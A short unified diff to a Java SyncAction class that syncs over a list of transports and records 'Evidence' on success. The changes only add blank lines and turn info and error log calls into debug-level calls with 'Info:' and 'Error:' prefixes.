@@ -101,6 +101,7 @@ public abstract class SyncAction extends SubAction {
 			final Transport transport = (Transport) transports.elementAt(i);
 			Log.d(TAG,"execute transport: " + transport);
 			Log.d(TAG,"transport Sync url: " + transport.getUrl());
+			
 			if (transport.isAvailable()) {
 				Log.d(TAG,"execute: transport available");
 				protocol.init(transport);
@@ -113,18 +114,20 @@ public abstract class SyncAction extends SubAction {
 					Log.e(TAG,e.toString());
 					ret = false;
 				}
+				
 				Log.d(TAG,"execute protocol: " + ret);
 			} else {
 				Log.d(TAG,"execute: transport not available");
 			}
 
 			if (ret) {
-				Log.i(TAG,"SyncAction OK");
+				Log.d(TAG,"Info: SyncAction OK");
 				Evidence.info("Synced with url:" + transport.getUrl());
 				status.synced = true;
 				return true;
 			}
-			Log.e(TAG,"SyncAction Unable to perform");
+			
+			Log.d(TAG,"Error: SyncAction Unable to perform");
 		}
 
 		return false;
